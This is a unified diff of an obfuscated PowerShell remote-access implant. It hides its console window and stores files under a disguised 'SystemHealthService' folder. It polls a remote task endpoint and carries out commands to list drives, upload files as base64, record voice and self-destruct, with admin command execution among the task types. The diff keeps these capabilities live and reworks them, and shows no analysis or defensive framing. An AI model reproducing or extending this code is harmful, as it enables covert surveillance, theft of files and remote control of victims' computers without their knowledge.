@@ -5,11 +5,10 @@ $ProgressPreference = "SilentlyContinue"
 
 try {
     Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
-    [void][Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
+    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
 } catch {}
 
 ${_bp} = (-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101))
-
 
 while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
     Start-Sleep 5
@@ -17,14 +16,14 @@ while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
 Start-Sleep 5
 
 ${_cfg} = Get-Content "${_bp}\config.json" -Raw | ConvertFrom-Json
-${_dif} = "${_bp}\device_id.txt"
+${_did}File = "${_bp}\device_id.txt"
 
-if (Test-Path ${_dif}) {
-    ${_did} = (Get-Content ${_dif} -Raw).Trim()
+if (Test-Path ${_did}File) {
+    ${_did} = (Get-Content ${_did}File -Raw).Trim()
 } else {
     ${_did} = [guid]::NewGuid().ToString()
-    ${_did} | Out-File ${_dif} -NoNewline
-    (Get-Item ${_dif}).Attributes = "Hidden"
+    ${_did} | Out-File ${_did}File -NoNewline
+    (Get-Item ${_did}File).Attributes = "Hidden"
 }
 
 ${_dn} = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
@@ -125,7 +124,7 @@ function Get-X0b2 {
                     }
                 }
 
-                Start-Sleep -Milliseconds 10
+                Start-Sleep -Milliseconds 50
                 
             } catch {
 
@@ -224,44 +223,101 @@ function Get-X0d4 {
     }
 }
 
-# File Browser
 function Browse-Files {
     param($path = "")
+    
     try {
         $items = @()
+        
         if ($path -eq "" -or $path -eq "drives") {
+
             $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
             foreach ($drive in $drives) {
-                $items += @{ name = "$($drive.Name):\"; type = "drive"; size = $drive.Used + $drive.Free; free = $drive.Free }
+                $items += @{
+                    name = "$($drive.Name):\"
+                    type = "drive"
+                    size = $drive.Used + $drive.Free
+                    free = $drive.Free
+                }
             }
         } else {
-            if ($path -match '^[A-Za-z]:\\?$') { $path = $path.TrimEnd('\') + '\' } else { $path = $path.TrimEnd('\\') }
-            if (!(Test-Path $path)) {
-                return @{ data_type = "file_list"; data = (@{ error = "Path not found: $path"; path = $path } | ConvertTo-Json -Compress) }
+
+            if ($path -match '^[A-Za-z]:\\?$') {
+
+                $path = $path.TrimEnd('\') + '\'
+            } else {
+                $path = $path.TrimEnd('\\')
             }
+            
+            if (!(Test-Path $path)) {
+                return @{
+                    data_type = "file_list"
+                    data = (@{ error = "Path not found: $path"; path = $path } | ConvertTo-Json -Compress)
+                }
+            }
+
             $children = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
             foreach ($child in $children) {
-                $items += @{ name = $child.Name; type = if ($child.PSIsContainer) { "folder" } else { "file" }; size = if ($child.PSIsContainer) { 0 } else { $child.Length }; modified = $child.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
+                $item = @{
+                    name = $child.Name
+                    type = if ($child.PSIsContainer) { "folder" } else { "file" }
+                    size = if ($child.PSIsContainer) { 0 } else { $child.Length }
+                    modified = $child.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
+                }
+                $items += $item
             }
         }
-        return @{ data_type = "file_list"; data = (@{ path = $path; items = $items; count = $items.Count } | ConvertTo-Json -Depth 5 -Compress) }
+        
+        return @{
+            data_type = "file_list"
+            data = (@{ path = $path; items = $items; count = $items.Count } | ConvertTo-Json -Depth 5 -Compress)
+        }
     } catch {
-        return @{ data_type = "file_list"; data = (@{ error = "Error: $_"; path = $path } | ConvertTo-Json -Compress) }
+        return @{
+            data_type = "file_list"
+            data = (@{ error = "Error: $_"; path = $path } | ConvertTo-Json -Compress)
+        }
     }
 }
 
-# File Download
 function Download-File {
-    param($filePath)
+    param($filePath, $chunkSize = 512000) # 500KB default
+    
     try {
-        if (!(Test-Path $filePath)) { return @{ data_type = "file_download"; data = (@{ error = "File not found: $filePath" } | ConvertTo-Json -Compress) } }
+        if (!(Test-Path $filePath)) {
+            return @{
+                data_type = "file_download"
+                data = (@{ error = "File not found: $filePath" } | ConvertTo-Json -Compress)
+            }
+        }
+        
         $fileInfo = Get-Item $filePath
-        if ($fileInfo.Length -gt 1073741824) { return @{ data_type = "file_download"; data = (@{ error = "File too large (max 1GB)"; size = $fileInfo.Length } | ConvertTo-Json -Compress) } }
+        $fileSize = $fileInfo.Length
+
+        if ($fileSize -gt 1073741824) {
+            return @{
+                data_type = "file_download"
+                data = (@{ error = "File too large (max 1GB)"; size = $fileSize } | ConvertTo-Json -Compress)
+            }
+        }
+
         $bytes = [System.IO.File]::ReadAllBytes($filePath)
         $base64 = [Convert]::ToBase64String($bytes)
-        return @{ data_type = "file_download"; data = (@{ filename = $fileInfo.Name; size = $fileInfo.Length; path = $filePath } | ConvertTo-Json -Compress); file_data = $base64 }
+        
+        return @{
+            data_type = "file_download"
+            data = (@{ 
+                filename = $fileInfo.Name
+                size = $fileSize
+                path = $filePath
+            } | ConvertTo-Json -Compress)
+            file_data = $base64
+        }
     } catch {
-        return @{ data_type = "file_download"; data = (@{ error = "Error: $_" } | ConvertTo-Json -Compress) }
+        return @{
+            data_type = "file_download"
+            data = (@{ error = "Error: $_" } | ConvertTo-Json -Compress)
+        }
     }
 }
 
@@ -366,7 +422,7 @@ function Execute-TaskWithTimeout {
                 $result = Get-X0c3
             }
             
-            "voice_capture" {
+            "voice_record" {
                 $duration = 10
                 if ($taskParams -and $taskParams.duration) {
                     $duration = [int]$taskParams.duration
@@ -431,7 +487,7 @@ while ($true) {
 
         Invoke-X0g7 -endpoint "devices?device_id=eq.${_did}" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
 
-        $tasks = Invoke-X0g7 -endpoint "tasks?device_id=eq.${_did}&status=eq.pending&select=id,task_type,task_params"
+        $tasks = Invoke-X0g7 -endpoint "tasks?device_id=eq.${_did}&status=eq.pending&task_type=not.in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
         
         if ($tasks) {
 
@@ -464,7 +520,7 @@ while ($true) {
                         $taskResult = Get-X0c3
                     }
                     
-                    "voice_capture" {
+                    "voice_record" {
                         $duration = 10
                         if ($task.task_params -and $task.task_params.duration) {
                             $duration = [int]$task.task_params.duration
@@ -506,25 +562,21 @@ while ($true) {
                         if ($filePath) {
                             $taskResult = Download-File -filePath $filePath
                         } else {
-                            $taskResult = @{ data_type = "file_download"; data = (@{ error = "No file path provided" } | ConvertTo-Json -Compress) }
+                            $taskResult = @{
+                                data_type = "file_download"
+                                data = (@{ error = "No file path provided" } | ConvertTo-Json -Compress)
+                            }
                         }
                     }
                     
                     "auto_destruct" {
 
-                        $taskResult = Remove-X0f6
-
                         $telemetryData = @{
                             device_id = ${_did}
-                            data_type = $taskResult.data_type
-                            data = $taskResult.data
+                            data_type = "destruct"
+                            data = "User agent received destruct - handing off to SYSTEM agent"
                         }
                         Invoke-X0g7 -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
-
-                        Invoke-X0g7 -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
-                            status = "complete"
-                            completed_at = (Get-Date -Format "o")
-                        } | Out-Null
 
                         exit 0
                     }
